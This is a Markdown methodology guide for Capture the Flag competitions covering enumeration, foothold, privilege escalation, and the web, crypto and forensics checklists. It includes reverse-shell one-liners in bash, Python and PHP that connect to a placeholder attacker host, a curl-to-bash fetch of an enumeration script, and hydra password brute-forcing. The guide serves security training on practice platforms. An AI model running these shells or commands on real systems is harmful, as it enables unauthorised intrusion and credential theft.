# 🏁 CTF Methodology

> A structured approach to Capture the Flag competitions. Stop guessing — work systematically.

---

## What is a CTF?

CTF (Capture the Flag) is a cybersecurity competition where you solve challenges to find hidden flags, usually in the format `FLAG{...}` or `HTB{...}`.

### Types of CTFs

| Type | Description |
|------|-------------|
| **Jeopardy** | Separate challenges across categories — most common |
| **Attack/Defence** | Teams attack each other's services |
| **King of the Hill** | Own and hold a machine |
| **Boot2Root** | Hack a full machine from foothold to root |

### Common Categories

- Web — SQLi, XSS, auth bypass, SSRF
- Crypto — encryption, encoding, hash cracking
- Reverse Engineering — analyse binaries
- Forensics — analyse files, images, memory dumps
- Pwn (Binary Exploitation) — buffer overflows, ROP chains
- OSINT — find real-world information
- Steganography — hidden data in files/images
- Misc — anything else

---

## General Approach (Jeopardy)

```
1. Read all challenges first
2. Pick easy/medium ones to score points early
3. Work systematically — don't jump randomly
4. Google aggressively — most CTF problems have similar solutions online
5. If stuck > 30 mins — move on and come back later
6. Collaborate — talk through problems with teammates
7. Check hints if available (sometimes cheaper than time spent)
```

---

## Boot2Root Methodology (HackTheBox / TryHackMe)

### Phase 1: Enumeration

```bash
# Network scan
nmap -sC -sV -oA initial <target_ip>
nmap -p- --min-rate 5000 -oA allports <target_ip>

# Web enumeration (if ports 80/443 open)
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<target>/FUZZ

# Service enumeration
enum4linux -a <target>       # SMB / NetBIOS
snmpwalk -v2c -c public <target>   # SNMP
```

### Phase 2: Foothold

Find one of:
- Web vulnerability (SQLi, LFI, RCE, file upload)
- Default or weak credentials on a service
- Publicly known exploit for a detected service version
- Exposed sensitive files (config, backup, git repo)

```bash
# Look up service versions on Exploit-DB
searchsploit "Apache 2.4.49"
searchsploit -m 50383  # Copy exploit to current dir

# Try default credentials
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
```

### Phase 3: Post-Exploitation / Enumeration

Once you have a shell:

```bash
id; whoami; hostname; uname -a
cat /etc/passwd
cat /etc/os-release

# Find interesting files
find / -name "*.txt" 2>/dev/null | grep -v proc
find / -name "*.conf" 2>/dev/null | grep -v proc
find / -perm -4000 2>/dev/null   # SUID binaries

# Automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

### Phase 4: Privilege Escalation

```bash
sudo -l           # Sudo permissions
crontab -l        # Scheduled jobs
ss -tulpn         # Listening services (internal only)
env               # Environment variables
cat ~/.bash_history

# Check GTFOBins for sudo/SUID exploits
# https://gtfobins.github.io/
```

### Phase 5: Flags

```bash
# User flag (usually /home/user/user.txt)
cat /home/*/user.txt

# Root flag
cat /root/root.txt
```

---

## Web CTF Checklist

```
□ View page source (Ctrl+U) — comments, hidden fields
□ Check robots.txt and sitemap.xml
□ Check cookies — decode Base64, look for JWT
□ Intercept with Burp — check all requests and responses
□ Fuzz directories and parameters
□ Check for error messages — they reveal stack/version info
□ Try SQL injection on all input fields
□ Check upload functionality — can you upload a shell?
□ Look at JavaScript files — API keys, endpoints, logic
□ Check HTTP headers — security misconfigurations
```

---

## Crypto CTF Checklist

```
□ Identify encoding (Base64? Hex? Binary?)
□ Try ROT13 / Caesar cipher shifts
□ Check for XOR — single byte XOR is common in CTFs
□ Identify hash type with hashid
□ Crack hash with hashcat / john
□ Look for weak RSA (small e, n, related primes)
□ Check for padding oracle vulnerability
□ Decode with CyberChef (https://gchq.github.io/CyberChef/)
```

---

## Forensics CTF Checklist

```
□ file <file>             — identify file type
□ strings <file>          — find readable text
□ xxd <file> | head       — check magic bytes / hex
□ binwalk <file>          — embedded files
□ foremost <file>         — file carving
□ exiftool <file>         — image metadata
□ steghide extract -sf image.jpg  — steganography
□ zsteg image.png         — PNG steganography
□ stegsolve               — visual steg analysis
□ Wireshark → follow TCP stream  — extract data from pcap
```

---

## Useful Tools for CTFs

### Swiss Army Knives

| Tool | Use |
|------|-----|
| [CyberChef](https://gchq.github.io/CyberChef/) | Encode/decode/transform anything |
| [GTFOBins](https://gtfobins.github.io/) | Privesc via common binaries |
| [HackTricks](https://book.hacktricks.xyz/) | Huge methodology reference |
| [ExplainShell](https://explainshell.com/) | Understand bash commands |
| [RevShells](https://www.revshells.com/) | Reverse shell one-liners |

### Per Category

```bash
# Web
burpsuite, ffuf, gobuster, sqlmap, nikto

# Crypto
hashcat, john, python3, pycryptodome, openssl

# Forensics
binwalk, foremost, volatility, wireshark, exiftool, steghide, zsteg

# Reverse Engineering
ghidra, radare2, gdb, strings, ltrace, strace, pwndbg

# Pwn
pwntools, gdb + pwndbg, checksec, ROPgadget

# OSINT
theHarvester, maltego, sherlock, spiderfoot
```

---

## Reverse Shell Quick Reference

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$s=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Listener on attacker machine
nc -lvnp PORT
rlwrap nc -lvnp PORT  # With arrow key support
```

---

## Upgrading a Dumb Shell

Once you have a basic netcat shell, upgrade it for a proper interactive experience:

```bash
# On victim
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z

# On attacker
stty raw -echo; fg

# On victim again
export TERM=xterm
stty rows 40 columns 160
```

---

## Platforms to Practice

| Platform | Level | Best For |
|----------|-------|---------|
| [TryHackMe](https://tryhackme.com) | Beginner | Guided learning paths |
| [HackTheBox](https://hackthebox.com) | Intermediate+ | Realistic machines |
| [PicoCTF](https://picoctf.org) | Beginner | Free, educational CTFs |
| [CTFtime](https://ctftime.org) | All levels | CTF event calendar |
| [PortSwigger Academy](https://portswigger.net/web-security) | All levels | Web security labs |
| [CryptoHack](https://cryptohack.org) | All levels | Cryptography challenges |

---

> 🎯 **Rule #1:** Enumerate more before exploiting. Most beginners jump to exploits too fast — 90% of the answer is in the enumeration.
